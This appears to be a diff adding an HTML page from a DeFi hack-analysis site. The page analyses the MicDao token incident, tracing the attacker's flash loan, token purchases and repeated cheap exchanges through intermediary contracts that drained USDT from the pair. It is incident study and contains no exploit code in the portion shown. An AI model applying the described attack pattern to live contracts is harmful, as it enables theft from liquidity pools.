@@ -1,0 +1,1328 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://autosaida.github.io/DeFiHackAnalysis/2023/231018_MicDao/">
+      
+      
+        <link rel="prev" href="../230905_HeavensGate_JumpFarm_QuantumWN/">
+      
+      
+        <link rel="next" href="../231206_TIME/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.41">
+    
+    
+      
+        <title>231018-MicDao - DeFiHackAnalysis</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Merriweather+Sans:300,300i,400,400i,700,700i%7CRed+Hat+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Merriweather Sans";--md-code-font:"Red Hat Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="https://unpkg.com/katex@0/dist/katex.min.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#231018-micdao" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="DeFiHackAnalysis" class="md-header__button md-logo" aria-label="DeFiHackAnalysis" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            DeFiHackAnalysis
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              231018-MicDao
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple"  aria-label="Dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="deep-orange"  aria-label="Light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Autosaida/DeFiHackAnalysis" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="DeFiHackAnalysis" class="md-nav__button md-logo" aria-label="DeFiHackAnalysis" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    DeFiHackAnalysis
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Autosaida/DeFiHackAnalysis" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2022
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            2022
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2022/221025_ULME/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    221025-ULME
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2022/221129_MBC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    221129-MBC-ZZSH
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2023
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            2023
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230119_SHOCO/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230119-SHICO
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230126_TINU/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230126-TINU
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230415_HundredFinance/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230415-HundredFinance
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230905_FloorDAO/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230905-FloorDAO
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../230905_HeavensGate_JumpFarm_QuantumWN/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230905-HeavensGate-JumpFarm-QuantumWN
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    231018-MicDao
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    231018-MicDao
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#attacktx" class="md-nav__link">
+    <span class="md-ellipsis">
+      AttackTx
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AttackTx">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fund-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fund Flow
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#balance-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Balance Changes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#state-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      State Changes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#invocation-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invocation Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerability
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reproduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reproduction
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow-a-crazy-hacker" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Flow | A Crazy Hacker
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Misc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Misc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#frontrunning-protection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Frontrunning Protection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#patch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Patch
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scam" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scam?
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../231206_TIME/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    231206-TIME
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2024
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            2024
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2024/240415_ChaingeFinance/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    240415-ChaingeFinance
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#attacktx" class="md-nav__link">
+    <span class="md-ellipsis">
+      AttackTx
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AttackTx">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fund-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fund Flow
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#balance-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Balance Changes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#state-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      State Changes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#invocation-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invocation Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerability
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reproduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reproduction
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow-a-crazy-hacker" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Flow | A Crazy Hacker
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Misc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Misc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#frontrunning-protection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Frontrunning Protection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#patch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Patch
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scam" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scam?
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="231018-micdao">231018-MicDao</h1>
+<h2 id="attacktx">AttackTx</h2>
+<p>Analyzing the <a href="https://explorer.phalcon.xyz/tx/bsc/0x24a2fbb27d433d91372525954f0d7d1af7509547b9ada29cc6c078e732c6d075">attack transaction</a> using Phalcon.</p>
+<h3 id="fund-flow">Fund Flow</h3>
+<p>The fund flow initially appears to be quite complex.</p>
+<p><img alt="Fund Flow" src="../../image/231018_MicDao.assets/0605.png" /></p>
+<p>First, the attacker borrowed approximately 670k USDT from the DoDo pool for the subsequent attack.</p>
+<p><img alt="Fund Flow" src="../../image/231018_MicDao.assets/0842.png" /></p>
+<p>Next, the attacker used 500k of that to purchase around 171k MicDao tokens from the PancakePair. (2, 3)</p>
+<p><img alt="Fund Flow" src="../../image/231018_MicDao.assets/1121.png" /></p>
+<p>Following this, the attack contract intermediated through contract <a href="https://bscscan.com/address/0xaebb54e6542f207d47c54eb6767184fc378e3164">0xaebb</a>, interacting with contract <a href="https://bscscan.com/address/0x19345233ea7486c1d5d780a19f0e303597e480b5">0x1934</a>, exchanging 2k USDT for 20k MicDao tokens. (4, 5, 6, 11)</p>
+<p><img alt="Fund Flow" src="../../image/231018_MicDao.assets/1336.png" /></p>
+<p>During this process, MicDao tokens and a significant amount of USDT (160k) were transferred into the pair. (7, 8)</p>
+<p><img alt="Fund Flow" src="../../image/231018_MicDao.assets/1524.png" /></p>
+<p>Simultaneously, LP tokens were minted. (9, 10)</p>
+<p>Therefore, the earlier transfer of tokens into the pair was likely for adding liquidity.</p>
+<p>The subsequent fund flow is nearly identical to the previous one, with multiple interactions involving the contract 0x1934, and the exchange of 2k USDT for 20k MicDao tokens. Therefore, the earlier 160k USDT added to liquidity likely represents the cumulative amount added through these interactions.</p>
+<p><img alt="Fund Flow" src="../../image/231018_MicDao.assets/2034.png" /></p>
+<p>Finally, the attacker exchanged approximately 974k MicDao tokens for about 672k USDT.</p>
+<p><img alt="Fund Flow" src="../../image/231018_MicDao.assets/2542.png" /></p>
+<p>In the end, some MicDao tokens were transferred to address 0x000...0001, suggesting a burn operation was executed. After repaying the borrowed funds, the attacker made a profit of approximately 12k USDT, which was sent to another address. (332)</p>
+<p>Clearly, the entire process reveals irregularities. Through intermediary contracts, the user could consistently exchange MicDao tokens at a fixed 1:10 price and receive additional MicDao tokens as a subsidy to add liquidity to the pair. The reason why attackers profit appears to be that after buying a large amount of MicDao tokens (after which the price of MicDao tokens will become very high), they can still continuously use intermediary contracts to obtain MicDao tokens at a fixed low price, while adding liquidity to the pool, so that even if some tokens were burnt, they can still sell the obtained more tokens at a better price and ultimately make a profit.</p>
+<h3 id="balance-changes">Balance Changes</h3>
+<p><img alt="Balance Changes" src="../../image/231018_MicDao.assets/2319.png" /></p>
+<p>The balance changes align closely with the Fund Flow analysis. It's evident that the USDT losses primarily came from the pair.</p>
+<h3 id="state-changes">State Changes</h3>
+<p><img alt="State Changes" src="../../image/231018_MicDao.assets/2857.png" /></p>
+<p>Notably, it appears that MicDao did not undergo similar burn operations in the past.</p>
+<h3 id="invocation-flow">Invocation Flow</h3>
+<p>Below, we provide a detailed analysis of the internal transaction calls.</p>
+<p><img alt="Invocation Flow" src="../../image/231018_MicDao.assets/3040.png" /></p>
+<p>Consistent with our earlier analysis, the attacker initiated a flash loan of USDT and, within the callback function, approved the corresponding token. Subsequently, they used 500,000 USDT to purchase MicDao tokens.</p>
+<p><img alt="Invocation Flow" src="../../image/231018_MicDao.assets/3010.png" /></p>
